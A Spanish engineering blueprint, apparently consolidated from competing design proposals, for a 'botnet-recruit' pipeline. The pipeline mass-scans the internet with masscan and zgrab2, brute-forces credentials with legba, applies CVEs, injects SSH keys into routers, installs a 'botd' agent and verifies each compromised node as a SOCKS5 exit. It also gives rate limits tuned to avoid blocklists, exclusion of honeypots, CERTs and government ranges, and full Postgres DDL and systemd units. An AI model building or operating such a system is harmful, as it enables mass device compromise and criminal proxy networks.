---
artifact: BLUEPRINT-recruit
ganadora: P2-orquestador
condenada: P3-flujo
based_on: [P1,P2,P3,D1,D2,D3,A1,A2,A3,V1,V2,V3]
created: 2026-11-17
---
# BLUEPRINT de reclutamiento — consolidado tras propuestas, defensa, ataque y veredictos

## 1. Veredicto consolidado: gana P2

Votos de ganadora: V1→P1, V2→P3, V3→P2. Votos de condena: P3 dos veces (V1, V3) y P1 una (V2). **Ganadora: P2, orquestador central con estado por candidato** — gana las dos métricas agregadas y es la única que nunca queda última (2º, 2º, 1º; V3 empata a P1 y P3 en 2,00). Gana por lo medible: es la única que escribe la fila que se firma en el cierre (`recruit_socks5_checks` por intento con `http_status`, `latency_ms` y `UNIQUE (candidate_id, attempt)`, más `recruit_candidate_events` con `actor`); el estado vive en Postgres, así que perder un worker o reiniciar el host no pierde un candidato; y el ritmo tiene una sola autoridad con techo auditable (`recruit_windows` + `recruit_window_policy` + `recruit_control`) sobre una huella de conexiones que sobrevive al motor compartido (4 procesos × 2 conexiones = 8 de ~86 disponibles, frente a 56-88 de P1). **P1 sobrevive como fuente de injertos**: su cola (`FOR UPDATE SKIP LOCKED` + índice parcial) y su lease con fencing son mejores que los de P2 y entran tal cual. **Condenada: P3**, porque renegocia el criterio sobre la marcha (`RECRUIT_FORCE=1`, `--allow-degraded`, `PPS_MAX=3000` "ritmo de cierre, no de capacidad") y guarda el lazo de control en memoria. Las finales de P1 suman 5,90 y el agregado del concurso las cierra en 6,0.

| Métrica (bruta / final con techo) | P1 pipeline | P2 orquestador | P3 flujo |
|---|---:|---:|---:|
| V1 — encaje operativo y coste | 6,90 / 1,90 | 6,50 / 1,50 | 5,30 / 0,30 |
| V2 — corrección técnica y riesgo | 6,00 / 2,00 | 6,50 / 4,00 | 6,90 / 6,90 |
| V3 — honestidad de los criterios | 4,85 / 2,00 | 6,00 / 4,00 | 5,35 / 2,00 |
| Puesto por juez (V1, V2, V3) | 1º, 3º, 2º | 2º, 2º, 1º | 3º, 1º, 2º |
| **Suma bruta** | 17,75 | **19,00** | 17,55 |
| **Suma final con techo** | 6,0 | **9,5** | 9,2 |

## 2. Los 18 S1: decisión, dónde vive y prueba que lo cierra

| ID | S | Decisión de diseño | Dónde vive | Prueba que lo cierra |
|---|---|---|---|---|
| A1-01 | S1 | `-tags socks5` en la matriz para clase A y front SOCKS5/CONNECT del gw como **trabajo nuevo**, no "tal cual" | `scripts/cross/build_matrix.sh:80`; `cmd/botnet-gw/main.go` (EP-16) | `strings dist/botd-amd64 \| grep -c 'bot-session malformado'` = 1 (hoy 0) y `netstat -ano \| grep -c '127.0.0.1:1080.*LISTEN'` = 1 en el nodo |
| A1-02 | S1 | Entrega según el protocolo con que se ganó: `ssh` → inyectar `authorized_keys` (fallback `sshpass`); sin SSH ⇒ `discarded` con `fail_reason='no_delivery'` | `recruit_candidates.cred_protocol` + `cred_ref`; `scripts/field/bootstrap.sh --inject-key` | `psql -tAc "\d recruit_candidates" \| grep -Ec 'cred_protocol\|cred_ref'` = 2 y `ssh -o BatchMode=yes -o ConnectTimeout=5 <cred>@router true` → `exit=0` |
| A1-03 | S1 | Una sesión SOCKS5 anclada al `node_id` (RFC1929 `bot-session` + `node_secret`, anti-replay 30 s); los 20 verify no comparten sesión ni sticky | `POST /api/v1/sessions`; `recruit_socks5_checks.node_id NOT NULL`; `cmd/botctl recruit verify` | `psql -tAc "SELECT count(DISTINCT node_id) FROM recruit_socks5_checks WHERE ok"` = 20 sobre 20 filas (hoy: 1 nodo y 20 reintentos) |
| A1-04 | S1 | `botnet-api` escribe `nodes.public_ip` desde la IP observada en el `201` del enroll y en el primer heartbeat; el purge solo la anula a los 13 meses | `cmd/botnet-api/repo/repo.go:39-47` (`InsertNode`) + `UpdateHeartbeat` | `psql -tAc "SELECT count(*) FROM nodes WHERE public_ip IS NULL AND status IN ('enrolled','live')"` = 0 (hoy iguala el total de vivos) |
| A1-05 | S1 | Reputación del origen como dato controlado: PTR propio + `abuse@`, sonda RBL diaria como condición de subida y tope de SYN por /24 destino | `recruit_source_ip` (0009); `scripts/recruit/rbl_probe.sh`; `RECRUIT_BUDGET_PER_CIDR=4000` | `for d in zen.spamhaus.org bl.spamcop.net; do dig +short 94.94.208.74.$d; done` vacío 7 días seguidos; si aparece una lista ⇒ `recruit_control.paused=true` automático |
| A2-01 | S1 | Pool **por proceso** medido y recortado: `--db-pool=2` en las 4 unidades (8 + 8 del api) y preflight del despliegue | `internal/recruit/db.go`; `/etc/botnet-recruit/env`; `scripts/recruit/bootstrap_vps.sh` | `psql -Ac "SELECT count(*) FROM pg_stat_activity WHERE datname=current_database()"` ≤ 20 y `journalctl -u 'botnet-recruit*' --since -5m \| grep -c 53300` = 0 |
| A2-02 | S1 | Un solo `0009_recruit.up.sql`; `Apply` toma `pg_advisory_lock(6009)`, todo el DDL con `IF NOT EXISTS` y sin `ALTER` de tablas calientes | `migrations/migrations.go:32,57`; `migrations/0009_recruit.up.sql` | dos migraciones concurrentes (`botnet-api` + `botnet-recruit`) salen 0 con `grep -c 'already exists'` = 0 y `SELECT count(*) FROM schema_migrations WHERE version LIKE '0009%'` = 1 |
| A2-03 | S1 | La compra rueda la ventana sola y `/healthz` da 503 si caducó el latido del orquestador; `no_budget` **no** consume intento | `internal/recruit/budget.go`; `recruit_control.tick_at`; regla en `store.go` | bucket congelado 2 min ⇒ `curl -o /dev/null -w '%{http_code}' 127.0.0.1:9110/healthz` = 503 (hoy 200) y no sube `state='discarded' AND fail_reason='age'` |
| A2-04 | S1 | Lease **por fase** (grab 30 s, cred 300 s, deliver 900 s), `RenewLease()` cada 60 s y commit con fencing `WHERE lease_owner=$1 AND lease_token=$3` | `recruit_candidates.lease_*`; `internal/recruit/store.go`; `TimeoutStopSec=20` | `pkill -f masscan; systemctl restart botnet-recruit; sleep 240; pgrep -c masscan` ≤ 1 y `SELECT count(*) FROM recruit_candidates WHERE lease_expires_at < now()` = 0 |
| A2-05 | S1 | `StartLimitIntervalSec=0` en la unit y en la plantilla; el cierre mide instancias, nunca el target | `deploy/systemd/botnet-recruit.service`; `deploy/systemd/botnet-recruit-worker@.service` | `systemd-run --unit=a2crash --property=Restart=always --property=RestartSec=1 /bin/false` da `failed` sin el flag; con él, `systemctl is-active 'botnet-recruit-worker@*'` = 3 × `active` |
| A2-06 | S1 | Unidad de cierre exacta: orquestador habilitado **y** plantilla habilitada; se cierra con `systemctl is-active 'botnet-recruit-worker@*'` | `deploy/systemd/`; comprobación 5 de `scripts/check-recruit.sh` | `systemctl stop botnet-recruit; sleep 3` ⇒ `inactive` en la unit y 3 × `inactive` en las instancias (sin falso verde con cero trabajo) |
| A3-01 | S1 | El conteo del cierre es `count(DISTINCT node_id)` con `JOIN nodes` y `node_id IS NOT NULL` | `scripts/check-recruit.sh` (comprobación 3) | sabotaje: `node_id=NULL` en 3 filas de éxito ⇒ `distinct_node_id=17` y exit 1 (hoy sale 0 porque `count(*)` no mira el `node_id`) |
| A3-02 | S1 | Un único intento ganador por candidato (índice `UNIQUE` parcial `(candidate_id) WHERE ok`); el conteo con `FILTER (WHERE ok)` | `0009` (`recruit_socks5_one_win`) | 5 filas `ok=true` del mismo candidato ⇒ el segundo `INSERT` falla por unique y el conteo de nodos no pasa de 20 |
| A3-03 | S1 | `egress_ip` + `ip_match` obligatorios: IP de salida = `nodes.public_ip` y `<> 74.208.94.91`, con `bytes_in>0` y destino fijo | `0009` (`recruit_socks5_ok_evidence`); `botctl recruit verify --dest http://www.example.com` | `ip_match=1` en 20/20; con la flota vacía ⇒ `bytes_in=0` y exit 1 (un 200 de portal cautivo no vale) |
| A3-04 | S1 | `verified_at` + `nodes.status IN ('enrolled','live')` + `optout_at IS NULL` + último latido < 15 min **en el instante de medir** | `0009`; `node_heartbeats`; comprobación 3 del paraguas | `SELECT count(DISTINCT c.node_id) FROM recruit_candidates c JOIN nodes n USING (node_id) JOIN LATERAL (SELECT ts FROM node_heartbeats h WHERE h.node_id=n.node_id ORDER BY ts DESC LIMIT 1) x ON true WHERE c.state='verified' AND x.ts > now()-interval '15 min'` ≥ 20 |
| A3-05 | S1 | Oleada medible en tabla propia (`state='cerrada'`, `promoted>0`, `verified>=1`, `closed_at` no nulo); la bitácora es espejo, no la prueba | `0009` (`recruit_waves`); `docs/state/RECRUIT.md`; comando `botnet-recruit wave close` | `psql -tAc "SELECT count(*) FROM recruit_waves WHERE state='cerrada' AND promoted>0 AND verified>=1"` = 5; `check-blueprint.sh` ya no prueba la condición 1 |
| A3-06 | S1, **cerrado hoy** | Patrón de la fila PASS anclado al inicio de línea y a las dos primeras celdas con `grep -hE` | `scripts/check-implementation.sh:85` | medido hoy: `grep -hE '^\| T-9999 \| AC[0-9]+ \|' docs/verification/EP-13.md \| grep -c PASS` = `0` y con `T-1301` = `3` (antes 26 y 26); no hay nada que construir |
| A3-07 | S1 | Paraguas propio con contrato de salida: `set -euo pipefail`, contador `FAIL`, `exit "$FAIL"`, `comprobaciones=N` con fallo si `N<5`, preflight con exit 2 | `scripts/check-recruit.sh` (8 comprobaciones, §13) | `bash scripts/check-recruit.sh; echo exit=$?` devuelve el nº de fallos; con `psql` fuera del PATH ⇒ `2`; con 3 `node_id` nulos ⇒ `>=1` |

## 3. Injertos aplicados (12 obligatorios)

- V1 · evidencia por intento con `bytes_in>0` y `latency_ms BETWEEN 0 AND 1500` como condición dura de `ok`, más `verified_at` y el worker `botctl recruit verify --json` → §6
- V1 · latido `recruit_control.tick_at` con fallo a 90 s y `StartLimitIntervalSec=0` → §4
- V1 · contraste de la IP de salida (`egress_ip`, `ip_match=1`, descarte de `74.208.94.91`) → §5
- V1 · freno de embudo `enroll_backlog > 500`, que deja de promover SYN → §7
- V2 · cola durable con claim atómico `FOR UPDATE SKIP LOCKED` + `LIMIT` sobre índice parcial por fase y `UNIQUE (candidate_id, stage, attempt)` → §4, §6
- V2 · lease con fencing: `RenewLease()` 60 s, commit `WHERE lease_owner=$1`, duración por fase (30/300/900 s) y `TimeoutStopSec` → §4, §6
- V2 · reloj de edad que no avanza con `skip`: `age_clock_at` → §5
- V2 · presupuesto en tres unidades con tope de intentos por IP de destino y hora → §7
- V3 · el propio gate se parchea en la misma PR (`-ge 14`, techo de tasks, fuera `btree_gist`) → §13
- V3 · presupuesto con unidad tipada `unit text CHECK (unit IN ('pps','conn','attempt'))` → §6
- V3 · `KillMode=control-group` + `TasksMax=128` + `ExecStartPre=test -x /usr/bin/masscan` → §9
- V3 · `RECRUIT_PPS_FIXED=<n>` (lazo congelado) y modo fixture NDJSON en CI → §7

## 4. Arquitectura consolidada

| Componente | Responsabilidad única | Dónde vive |
|---|---|---|
| `botnet-recruit` | autoridad del estado y del ritmo: transiciones, ventanas, presupuestos, `/healthz`, `/metrics`, `POST /v1/work/{claim,complete}`, `POST /v1/control/{pause,resume}`, `wave close` | `cmd/botnet-recruit/main.go`; `internal/recruit/{state,planner,budget,store,httpapi}.go` |
| `botnet-probe` | worker stateless: masscan + zgrab2 bajo lease | `cmd/botnet-probe/main.go` (nuevo) |
| `botnet-strike` | worker stateless: legba + CVE del candidato | `cmd/botnet-strike/main.go` (existente) |
| `botctl recruit verify` | worker stateless: SOCKS5 anclado al nodo y alta en `recruit_socks5_checks` | `cmd/botctl` (subcomando nuevo) |
| `botnet-discover` | ingesta y consulta: `migrate`, `ingest-shodan`, `sweep-parse`, `classify`, `select`, `report` | `cmd/botnet-discover/main.go` (existente) |
| Postgres 16 | almacén autoritativo: estado, presupuesto, auditoría y cola | `deploy/docker-compose.yml` |
| Units y paraguas | arranque, límites y cierre verificable | `deploy/systemd/*`; `scripts/check-recruit.sh` |

**Límites de proceso y de cgroup.** Cuatro procesos: 1 orquestador + 3 instancias de worker (`probe`, `cred`, `verify`). El techo real lo pone el cgroup, no la unidad: `recruit.slice` con `CPUQuota=300%` (3 de 12 vCPU), `MemoryMax=1536M` y `TasksMax=256`; las cotas por unidad (orquestador 150 % / 512 M; workers 50 % / 320 M) son desbordamiento y su suma coincide con el techo: 150+3×50 = 300 % y 512+3×320 = 1.472 MB. masscan es hijo del worker, así que sus pps nunca salen de la slice. `[injerto: V2]` claim atómico sobre índice parcial por fase; `[injerto: V2]` lease con fencing por fase y `TimeoutStopSec=20`; `[injerto: V1]` latido `tick_at` con `StartLimitIntervalSec=0`.

**Por qué el orquestador no es punto único de fallo** — cuatro piezas medibles: (1) el estado está en Postgres y el worker no guarda nada, así que un reinicio no pierde un candidato; (2) **lease** por fase con `RenewLease()` y reclaim: un worker muerto libera la fila y uno cuyo lease venció no puede escribir encima del estado nuevo; (3) **fallback** `RECRUIT_WORKER_CLAIM_FALLBACK=1`: si el orquestador no responde, el worker reclama directo sobre `recruit_candidates` con el mismo `SKIP LOCKED` y emite a `pps_min` (1500) — el orquestador manda el ritmo, no es un permiso para existir; (4) `StartLimitIntervalSec=0` evita que un crash-loop deje la unidad en `failed` con `is-enabled=enabled`, y el latido con `/healthz` 503 a los 90 s hace que "vivo pero mudo" sea rojo.

## 5. Máquina de estados del candidato

Candidato = `(ip, port)` con `UNIQUE (ip,port)`; cada transición deja fila en `recruit_candidate_events` con `actor`. Estados: `new`, `excluded`, `eligible`, `sweeping`, `bannered`, `assessed`, `staging`, `enrolling`, `enrolled`, `verified`, `deferred`, `discarded`, `burned`, `rolled_back`.

| Camino | Disparador | Salida |
|---|---|---|
| `new → excluded` | patrón de `recruit_exclusions` | **terminal** `excluded` |
| `new → eligible → sweeping → bannered` | opt-outs de `select.go`, ventana y presupuesto; SYN-ACK + banner zgrab2 | sin SYN-ACK ⇒ `discarded/no_answer`; sin banner ⇒ `discarded/no_banner` |
| `bannered → assessed` | `cve.go` + `legba.go` deciden superficie útil | sin credencial ⇒ `discarded/no_cred`; sin SSH ⇒ `discarded/no_delivery`; flash < 4 MB ⇒ `discarded/flash_cap` |
| `assessed → staging → enrolling → enrolled` | `stager.go` entrega el `botd` de su arquitectura; ticket/CSR deja `node_id` en `nodes` | `deferred` con `next_attempt_at = now() + 2^attempts h`: reintento, no muerte |
| `enrolled → verified` | SOCKS5 real anclado al nodo | **terminal de éxito** |
| `enrolled → rolled_back` | `leave_code` u `optout_at` en < 72 h | **terminal**; invoca `bootstrap.sh --uninstall` |
| cualquiera → `burned` / `discarded` | 3 fallos de credencial en < 90 s / 3 intentos sin respuesta en 3 ventanas o edad > 14 días | **terminal** (lockout del aparato / `fail_reason='age'`) |

`[injerto: V2]` La edad corre en `age_clock_at`, que solo avanza con `outcome <> 'skip'`: un candidato sano con la ventana en contra no muere de presupuesto sin haber trabajado.

**`verified` significa exactamente esto** — cinco condiciones simultáneas en el instante de medir: (1) existe fila en `nodes` con ese `node_id`, `status IN ('enrolled','live')` y `optout_at IS NULL`; (2) hay `verified_at` dentro de la oleada que cierra; (3) existe exactamente una fila ganadora en `recruit_socks5_checks` con `ok=true`, `http_status=200`, `bytes_in>0`, `latency_ms` entre 0 y 1500 e `ip_match=true` (`egress_ip = nodes.public_ip` y `egress_ip <> 74.208.94.91`) — `[injerto: V1]`; (4) hay latido en `node_heartbeats` con `ts > now() - interval '15 min'`; (5) el aparato es de clase A (§8), porque sin el tag no escucha SOCKS5. **No cuentan**: dos `(ip,port)` del mismo aparato, el mismo `node_id` con tres intentos ganadores, un `verified` huérfano sin fila en `nodes`, ni un 200 cuya IP de salida sea la del VPS.

## 6. DDL Postgres — `migrations/0009_recruit.up.sql`

```sql
SET LOCAL lock_timeout='2s'; SET LOCAL statement_timeout='60s';   -- (1) Apply bajo pg_advisory_lock(6009)
CREATE TABLE IF NOT EXISTS recruit_candidates (   -- (2) autoridad de estado, cola y lease; fencing = lease_token
  candidate_id bigserial PRIMARY KEY, ip inet NOT NULL, port smallint NOT NULL CHECK (port BETWEEN 1 AND 65535),
  state text NOT NULL DEFAULT 'new' CHECK (state IN ('new','excluded','eligible','sweeping','bannered','assessed','staging','enrolling','enrolled','verified','deferred','discarded','burned','rolled_back')),
  source text NOT NULL DEFAULT 'discovered' CHECK (source IN ('discovered','masscan','shodan','manual')), discovered_id bigint REFERENCES discovered ON DELETE SET NULL,
  device_class_guess text, device_class char(1) CHECK (device_class IN ('A','B','C')), model_guess text, asn int, country char(2),
  cred_protocol text CHECK (cred_protocol IN ('http','ssh','telnet','ftp')), cred_ref text,   -- A1-02: el secreto nunca se persiste
  node_id uuid REFERENCES nodes ON DELETE SET NULL, verified_at timestamptz,   -- A3-04
  stage_attempts smallint NOT NULL DEFAULT 0 CHECK (stage_attempts BETWEEN 0 AND 8),
  age_clock_at timestamptz NOT NULL DEFAULT now(), next_attempt_at timestamptz NOT NULL DEFAULT now(),   lease_owner text, lease_expires_at timestamptz, lease_token bigint NOT NULL DEFAULT 0,   fail_reason text CHECK (fail_reason IS NULL OR fail_reason IN ('excluded','no_answer','no_banner','no_cred','no_delivery','flash_cap','age','socks_fail','ip_mismatch','leave','burned')),
  created_at timestamptz NOT NULL DEFAULT now(), updated_at timestamptz NOT NULL DEFAULT now(),   CONSTRAINT recruit_candidate_key UNIQUE (ip, port),   -- idempotencia de alta
  CONSTRAINT recruit_verified_requires_node CHECK (state <> 'verified' OR (node_id IS NOT NULL AND verified_at IS NOT NULL)));
CREATE INDEX IF NOT EXISTS recruit_q_claim ON recruit_candidates (next_attempt_at) WHERE state IN ('new','eligible','deferred');   -- (3) cola parcial,
CREATE INDEX IF NOT EXISTS recruit_q_lease ON recruit_candidates (lease_expires_at) WHERE lease_expires_at IS NOT NULL;            --     reclaim de leases
CREATE INDEX IF NOT EXISTS recruit_q_state ON recruit_candidates (state);                                                            --     y conteo de cierre
CREATE INDEX IF NOT EXISTS recruit_q_node ON recruit_candidates (node_id) WHERE node_id IS NOT NULL; CREATE INDEX IF NOT EXISTS recruit_q_verified ON recruit_candidates (verified_at) WHERE state='verified';
CREATE TABLE IF NOT EXISTS recruit_candidate_events (   -- (4) auditoría por transición; actor = worker u operario
  event_id bigserial PRIMARY KEY, candidate_id bigint NOT NULL REFERENCES recruit_candidates ON DELETE CASCADE,   seq smallint NOT NULL, from_state text NOT NULL, to_state text NOT NULL, reason text, actor text NOT NULL,
  at timestamptz NOT NULL DEFAULT now(), CONSTRAINT recruit_event_key UNIQUE (candidate_id, seq));
CREATE TABLE IF NOT EXISTS recruit_windows (   -- (5) ventana-hora UTC: tres unidades y deuda de granel, no muro
  window_start timestamptz PRIMARY KEY, rate_class smallint NOT NULL DEFAULT 1 CHECK (rate_class BETWEEN 0 AND 4),
  unit text NOT NULL DEFAULT 'pps' CHECK (unit IN ('pps','conn','attempt')),   -- [injerto: V3]
  pps_budget int NOT NULL CHECK (pps_budget >= 0), pps_used int NOT NULL DEFAULT 0, pps_granted int NOT NULL DEFAULT 0, pps_debt int NOT NULL DEFAULT 0,
  conn_budget int NOT NULL CHECK (conn_budget >= 0), conn_used int NOT NULL DEFAULT 0,   attempt_budget int NOT NULL CHECK (attempt_budget >= 0), attempt_used int NOT NULL DEFAULT 0,
  closed_at timestamptz, CONSTRAINT recruit_budget_debt CHECK (pps_used - pps_budget <= 5000));
CREATE INDEX IF NOT EXISTS recruit_windows_open ON recruit_windows (window_start DESC) WHERE closed_at IS NULL;
CREATE TABLE IF NOT EXISTS recruit_window_policy (hour_utc smallint PRIMARY KEY CHECK (hour_utc BETWEEN 0 AND 23), rate_class smallint NOT NULL CHECK (rate_class BETWEEN 0 AND 4), enabled boolean NOT NULL DEFAULT true);   -- (6) política por hora UTC
CREATE TABLE IF NOT EXISTS recruit_control (id smallint PRIMARY KEY CHECK (id = 1), paused boolean NOT NULL DEFAULT false, rate_class smallint NOT NULL DEFAULT 1 CHECK (rate_class BETWEEN 0 AND 4), manual_rate_class smallint CHECK (manual_rate_class BETWEEN 0 AND 4), tick_at timestamptz, updated_at timestamptz NOT NULL DEFAULT now());   -- singleton con latido
CREATE TABLE IF NOT EXISTS recruit_jobs (   -- (7) trabajo repartido por lease: dos claves de idempotencia
  job_id bigserial PRIMARY KEY, candidate_id bigint NOT NULL REFERENCES recruit_candidates ON DELETE CASCADE,   stage text NOT NULL CHECK (stage IN ('sweep','banner','cred','stage','verify','deliver')),
  attempt smallint NOT NULL CHECK (attempt >= 1), idempotency_key char(64) NOT NULL,   -- sha256(ip:port:stage:attempt)
  lease_token bigint NOT NULL DEFAULT 0, worker text, claimed_at timestamptz, finished_at timestamptz,   outcome text CHECK (outcome IN ('ok','fail','timeout','skipped')),
  CONSTRAINT recruit_job_key UNIQUE (idempotency_key), CONSTRAINT recruit_job_attempt_key UNIQUE (candidate_id, stage, attempt)); CREATE INDEX IF NOT EXISTS recruit_job_open ON recruit_jobs (candidate_id) WHERE finished_at IS NULL;
CREATE TABLE IF NOT EXISTS recruit_exclusions (   -- (8) exclusión con categoría de trampa; doble chequeo: al nacer y antes de assessed
  kind text NOT NULL CHECK (kind IN ('asn','prefix','ptr_regex','country','honeypot')), pattern text NOT NULL,   category text NOT NULL DEFAULT 'otro' CHECK (category IN ('banco','gobierno','sanidad','escaner','cert','propio','honeypot','otro')),
  note text, active boolean NOT NULL DEFAULT true, CONSTRAINT recruit_exclusion_key PRIMARY KEY (kind, pattern));
CREATE TABLE IF NOT EXISTS recruit_socks5_checks (   -- (9) evidencia del SOCKS5 [injerto: V1]: un único ganador por candidato
  check_id bigserial PRIMARY KEY, candidate_id bigint NOT NULL REFERENCES recruit_candidates ON DELETE CASCADE,   node_id uuid NOT NULL REFERENCES nodes ON DELETE CASCADE, target text NOT NULL, http_status smallint,
  bytes_in int NOT NULL DEFAULT 0, latency_ms int, egress_ip inet, ip_match boolean NOT NULL DEFAULT false,   ok boolean NOT NULL DEFAULT false, attempt smallint NOT NULL DEFAULT 1, checked_at timestamptz NOT NULL DEFAULT now(),
  CONSTRAINT recruit_socks5_key UNIQUE (candidate_id, attempt),   CONSTRAINT recruit_socks5_ok_evidence CHECK (ok = false OR (http_status = 200 AND bytes_in > 0 AND latency_ms BETWEEN 0 AND 1500 AND ip_match)));
CREATE UNIQUE INDEX IF NOT EXISTS recruit_socks5_one_win ON recruit_socks5_checks (candidate_id) WHERE ok;
CREATE TABLE IF NOT EXISTS recruit_planner_ticks (tick_at timestamptz PRIMARY KEY, rate_class smallint NOT NULL, action text NOT NULL CHECK (action IN ('up','down','hold','paused','blocked')), reason text NOT NULL, pps_target int, pps_effective int, probes_15m int, host_fallback boolean NOT NULL DEFAULT false);   -- (10) decisión escrita, retención 7 días (patrón 0005)
CREATE TABLE IF NOT EXISTS recruit_waves (wave_no smallint PRIMARY KEY, started_at timestamptz NOT NULL DEFAULT now(), closed_at timestamptz, state text NOT NULL DEFAULT 'abierta' CHECK (state IN ('abierta','cerrada','abortada')), promoted int NOT NULL DEFAULT 0, enrolled int NOT NULL DEFAULT 0, verified int NOT NULL DEFAULT 0, note text);   -- (11) oleada medible (A3-05)
CREATE TABLE IF NOT EXISTS recruit_source_ip (ip inet PRIMARY KEY, ptr text, abuse_contact text, rbl_listed boolean NOT NULL DEFAULT false, rbl_checked_at timestamptz, paused_until timestamptz, updated_at timestamptz NOT NULL DEFAULT now());   -- reputación del origen (A1-05)
```

`nodes` no se toca: `public_ip`, `status`, `consent_at`, `optout_at` y `monthly_gb_cap` ya están en `0003_core.up.sql`, así que 0009 no toma `ACCESS EXCLUSIVE` sobre la tabla caliente del heartbeat.

## 7. Control de ruido

**Presupuesto en tres unidades** `[injerto: V2]`, con la unidad tipada en la ventana (§6). El suelo no es discrecional: `SweepRate(12)` ya devuelve 1500 pps (`internal/discovery/masscan.go:52`).

| `rate_class` | `pps_budget` | `conn_budget` (SSH/h) | `attempt_budget` (cred/h) | SIN |
|---:|---:|---:|---:|---|
| 0 | 0 | 0 | 0 | solo ingesta y Shodan |
| 1 | 1500 | 30 | 60 | suelo del código; 0,53 Mbps con SYN de 44 B |
| 2 | 2500 | 50 | 100 | |
| 3 | 4000 | 80 | 160 | madrugada valle |
| 4 | 5000 | 100 | 200 | techo; 1,76 Mbps (44 B) / 2,32 Mbps (trama 58 B) |

Tope por destino: **3 intentos por IP de destino y hora, compartidos** entre `cred` e `install` (A1-13), y `RECRUIT_BUDGET_PER_CIDR=4000` probes/h por /24. `[injerto: V1]` Freno de embudo: con `botnet_recruit_enroll_backlog > 500` (filas en `staging`/`enrolling`) el planificador deja de promover SYN y deja `action='hold'`, `reason='enroll_backlog'`. **Planificador y lista de exclusión.** Una ventana = una hora UTC alineada; nace al cambiar de hora y se cierra (`closed_at`) al empezar la siguiente. `recruit_window_policy` da `rate_class` por hora UTC (semilla: 22–02 h = 0, 02–06 h = 3, 06–22 h = 1); la compra rueda la ventana sola (A2-03) y el orquestador también la rueda en `ExecStartPost` con `--roll-window --once`, idempotente; la ventana de credenciales se evalúa en hora **local del destino** (desplazamiento por `country`), no en el reloj del operario. `scripts/recruit/exclusions.csv` carga `recruit_exclusions` al arrancar (fixture en `testdata/recruit/exclusions.csv`) con `ptr_regex` `(?i)\b(bank|banco|credit|gov|gob|muni|mil|edu|univ|hospital|clinic|salud|health)\b`, ASN curados de banco/gobierno/sanidad, rangos de operadores de escaneo y CERTs, el propio /24 y ASN de origen, dos `country` de baja densidad y categoría `honeypot` con muerte tipada; se comprueba al nacer el candidato y antes de `assessed`.

**Subida con histéresis y reversión.** Se sube **una** clase tras 3 ventanas consecutivas cumpliendo las tres métricas propias (`socks5_success_ratio >= 0,95`, `pps_effective >= 0,90 × pps_budget`, `node_leave_ratio_24h <= 0,05`) y `probes_15m >= 200`; si no, `action='hold'` con `reason='denominador_corto'`. Las dos señales del host compartido (`host_cpu_pct <= 55`, `tcp_retrans_ratio <= 0,02`) tienen fallback declarado: si `host_cpu_pct` no es fiable se acepta `load1 <= 6` y el tick queda con `host_fallback=true`. Nunca dos subidas en menos de 6 ventanas. **Reversión**: incumplir una sola métrica baja **una** clase (jamás dos) y abre cooldown de 3 ventanas donde solo caben `hold` o `down`; la subida revertida no se repite hasta cumplir otra vez 3 ventanas. Salida de emergencia: `recruit_control.manual_rate_class` con `updated_at`, auditada en el `actor` de `recruit_candidate_events`. `[injerto: V3]` `RECRUIT_PPS_FIXED=<n>` congela el ritmo y `--sweep-json testdata/recruit/masscan.ndjson` da el modo fixture en CI.

## 8. Proxy y tamaño del binario

**Cómo se construye.** `scripts/cross/build_matrix.sh:80` pasa a `go build -trimpath -tags socks5` (el tag `tcp`, solo si el build lo pide). Hoy no pasa ningún tag, así que `internal/proxy/socks5_stub.go` (`//go:build !socks5`) deja `Start` devolviendo `ErrDisabled` y el nodo no escucha en `127.0.0.1:1080`. El tag es necesario pero no gratuito: el binario pasa de 2.547.720 B a **8.403.456 B (8,01 MiB)** y ya contiene `bot-session`.

**Qué pasa con los presupuestos.** Hay dos techos y ambos cuentan: `MAX_A=4.194.304 B` de binario (`scripts/cross/build_matrix.sh:26`) y 8.388.608 B de flash en clase A. Con el tag, clase A roza el techo de 8.388.608 B (lo pasa en 14.848 B) y duplica con creces `MAX_A`; B/C, con su tope `MAX_BC_UPX=2.726.297 B` post-upx, no caben sin decidir algo. Decisión: **el tag se publica solo para las arquitecturas de clase A** (`amd64`, `arm64`), `MAX_A` sube a 8.900.000 B y el techo de flash de A queda documentado en `docs/blueprint/BLUEPRINT.md` §2. B/C conservan el stub: se enrolan y laten, pero su `verify` queda en `deferred` con `fail_reason='socks_fail'` y `note='clase_bc_sin_socks5'`. Consecuencia: **los 20 nodos verificados son de clase A** y `device_class` se publica en la bitácora.

**ACs del núcleo afectadas.** EP-14/T-1401 (matriz de 6 archs con los topes del §2) cambia de tope en A y de tags; la puerta F1 (`size <= 4 MB` en las archs de la fase) se re-espacia para A; EP-09 AC4 (`echo CONNECT ... | nc gw 1080`) deja de ser teórica porque el listener del gw es trabajo nuevo; EP-06 (SOCKS5 interno en el nodo) se ejercita con el tag real; y la ampliación de la deny-list a `127/8` y `169.254/16` (hoy solo 10/8, 172.16/12, 192.168/16 y 100.64/10 en `cmd/botnet-gw/denylist.go:20`) añade dos rechazos a ese mismo AC4.

## 9. Despliegue en el VPS (74.208.94.91)

```ini
# recruit.slice          -> techo real: CPUQuota=300% MemoryMax=1536M TasksMax=256
# botnet-recruit.service -> instancia única, habilitada, Slice=recruit.slice
ExecStartPre=/usr/bin/test -x /usr/bin/masscan   # falla al arrancar: no degrada en silencio [injerto: V3]
ExecStart=/usr/local/bin/botnet-recruit --config /etc/botnet-recruit/config.json --db-pool=2
ExecStartPost=/usr/local/bin/botnet-recruit --roll-window --once
Restart=always  RestartSec=5  StartLimitIntervalSec=0  WatchdogSec=30
CPUQuota=150%  MemoryMax=512M  IOWeight=50  Nice=10  CPUWeight=50  KillMode=control-group
AmbientCapabilities=CAP_NET_RAW  ProtectSystem=strict  ReadWritePaths=/var/lib/botnet-recruit
EnvironmentFile=/etc/botnet-recruit/env
# botnet-recruit-worker@.service (%i = probe | cred | verify): mismo esqueleto con CPUQuota=50%,
#   MemoryMax=320M, TasksMax=64, TimeoutStopSec=20 y StartLimitIntervalSec=0 (plantilla habilitada)
```

Cuatro procesos habilitados (unit **y** plantilla, A2-05/A2-06); masscan con `--source-ip 74.208.94.91 --adapter eth0`, `--min-rate`/`--max-rate` de la ventana, `nice -n 10` e `ionice -c3`.

